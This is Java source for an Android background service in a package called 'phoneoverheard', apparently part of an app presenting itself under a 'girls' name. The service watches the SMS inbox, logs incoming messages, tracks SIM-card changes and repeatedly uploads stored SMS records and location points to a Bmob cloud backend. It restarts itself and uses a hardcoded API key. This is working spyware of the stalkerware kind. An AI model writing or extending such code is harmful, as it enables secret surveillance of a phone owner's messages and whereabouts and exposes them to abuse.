package com.phoneoverheard.phone;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.telephony.SmsMessage;
import android.util.Log;
import cn.bmob.v3.Bmob;
import cn.bmob.v3.BmobObject;
import cn.bmob.v3.datatype.BmobGeoPoint;
import cn.bmob.v3.listener.SaveListener;
import cn.linving.girls.MyApplication;

import com.phoneoverheard.bean.LocNormal;
import com.phoneoverheard.bean.Sms;
import com.phoneoverheard.bean.User;
import com.phoneoverheard.db.LocNormalUnit;
import com.phoneoverheard.db.SmsUnit;
import com.phoneoverheard.interfaces.Constant;
import com.phoneoverheard.util.StringUtils;
import com.phoneoverheard.util.Util;

public class BackService extends Service {

	private Context context;
	private SMSReceiver receiver;
	private SmsObserver smsObserver;
	private LocNormalUnit locNormalUnit;
	private SmsUnit smsUnit;
	private Handler handler;
	// 正在检测上传
	private boolean isChecking = false;
	
	private User user;

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub

		context = this;

		IntentFilter filter = new IntentFilter();
		// filter.addAction(SMSReceiver.SMS_RECEIVED_ACTION);
		filter.addAction(SMSReceiver.ACTION_SIM_STATE_CHANGED);
		filter.addAction(Constant.INTENT_ACTION_TIMER_CHECK_TO_SUBMIT);
		filter.setPriority(Integer.MAX_VALUE);
		receiver = new SMSReceiver();
		registerReceiver(receiver, filter);

		// 开启定时检查
		AlarmReceiver.startRepeatAlarmer(this, Constant.ALARM_INTERVAL_HOUR_TO_CHECK_SUBMIT);

		Bmob.initialize(getApplicationContext(), "404e868375438ee2f3b5f0d2a37e4d14");

		locNormalUnit = new LocNormalUnit(context);

		handler = new Handler() {
			@Override
			public void handleMessage(Message msg) {
				// TODO Auto-generated method stub
				switch (msg.what) {
				case Constant.MSG_CODE_CHECK_LOC_NORMAL:
					checkLocNormal();
					break;
				case Constant.MSG_CODE_CHECK_SMS:
					checkSms();
					break;

				default:
					break;
				}
				super.handleMessage(msg);
			}
		};

		smsUnit = new SmsUnit(context);
		smsObserver = new SmsObserver(context, handler);
		getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, smsObserver);
		smsObserver.checkSmsBoxFirstTime();
		
		user = MyApplication.getInstance().user;

		super.onCreate();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		return START_STICKY;
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub

		unregisterReceiver(receiver);
		super.onDestroy();
	}

	/**
	 * 检查常态定位数据并上传
	 * 
	 * @author liulei
	 * @date 2015-9-16 void
	 */
	private void checkLocNormal() {

		isChecking = true;
		
		String objectId = "null";
		if(null != user){
			objectId = user.getObjectId();
		}

		// 获取10条定位数据，小于10条则没有最新的数据，进入下一项上传任务
		final List<LocNormal> list = locNormalUnit.getUnuploadLocs();
		// 是否继续读取数据库上传

		if (null != list) {

			List<BmobObject> uploads = new ArrayList<BmobObject>();

			for (LocNormal locNormal : list) {

				LocNormal upload = new LocNormal();

				upload.setPoint(new BmobGeoPoint(locNormal.getLng(), locNormal.getLat()));
				upload.setUserId(objectId);
				uploads.add(upload);
			}

			new BmobObject().insertBatch(context, uploads, new SaveListener() {

				@Override
				public void onSuccess() {
					// TODO Auto-generated method stub
					// 多线程异常
					new LocNormalUnit(context).updateUploadSuccess(list);

					if (list.size() == 10) {
						handler.sendEmptyMessage(Constant.MSG_CODE_CHECK_LOC_NORMAL);
					} else {
						handler.sendEmptyMessage(Constant.MSG_CODE_CHECK_SMS);
					}
				}

				@Override
				public void onFailure(int arg0, String arg1) {
					// TODO Auto-generated method stub
				}
			});
		} else {
			handler.sendEmptyMessage(Constant.MSG_CODE_CHECK_SMS);
		}
	}

	private void checkSms() {

		// 获取10条定位数据，小于10条则没有最新的数据，进入下一项上传任务
		final List<Sms> list = smsUnit.getUnuploadDatas();
		// 是否继续读取数据库上传

		if (null != list) {

			List<BmobObject> uploads = new ArrayList<BmobObject>(list);

			new BmobObject().insertBatch(context, uploads, new SaveListener() {

				@Override
				public void onSuccess() {
					// TODO Auto-generated method stub
					// 多线程异常
					new SmsUnit(context).updateUploadSuccess(list);

					if (list.size() == 10) {
						handler.sendEmptyMessage(Constant.MSG_CODE_CHECK_SMS);
					} else {
						handler.sendEmptyMessage(Constant.MSG_CODE_CHECK_FILE_UPLOAD);
					}
				}

				@Override
				public void onFailure(int arg0, String arg1) {
					// TODO Auto-generated method stub
				}
			});
		} else {
			handler.sendEmptyMessage(Constant.MSG_CODE_CHECK_FILE_UPLOAD);
		}

	}

	private void checkFileUpload() {
	}

	/**
	 * 使用精准定位
	 * 
	 * @author liulei
	 * @date 2015-9-18 void
	 */
	private void startLocExact() {
	}

	public class SMSReceiver extends BroadcastReceiver {

		public static final String TAG = "ImiChatSMSReceiver";
		public static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
		public final static String ACTION_SIM_STATE_CHANGED = "android.intent.action.SIM_STATE_CHANGED";

		@Override
		public void onReceive(Context context, Intent intent) {

			String action = intent.getAction();

			if (action.equals(SMS_RECEIVED_ACTION)) {

				SmsMessage msg = null;
				Object[] messages = (Object[]) intent.getSerializableExtra("pdus");

				for (Object object : messages) {
					msg = SmsMessage.createFromPdu((byte[]) object);

					Date date = new Date(msg.getTimestampMillis());// 时间
					String time = StringUtils.formatDate(date, StringUtils.DEFAULT_DATETIME_PATTERN);
					String content = msg.getDisplayMessageBody();
					String phone = msg.getOriginatingAddress();

					Log.i(TAG, "number:" + phone + "   body:" + content + "  time:" + time);

				}

			} else if (action.equals(Constant.INTENT_ACTION_TIMER_CHECK_TO_SUBMIT)) {

				if (MyApplication.getInstance().isLogin()) {
					handler.sendEmptyMessage(Constant.MSG_CODE_CHECK_LOC_NORMAL);
				}
			} else if (intent.getAction().equals(ACTION_SIM_STATE_CHANGED)) {

				if (Util.haveSim(context)) {
					// 检测是否更换了sim卡
				}
			}
		}
	}

}
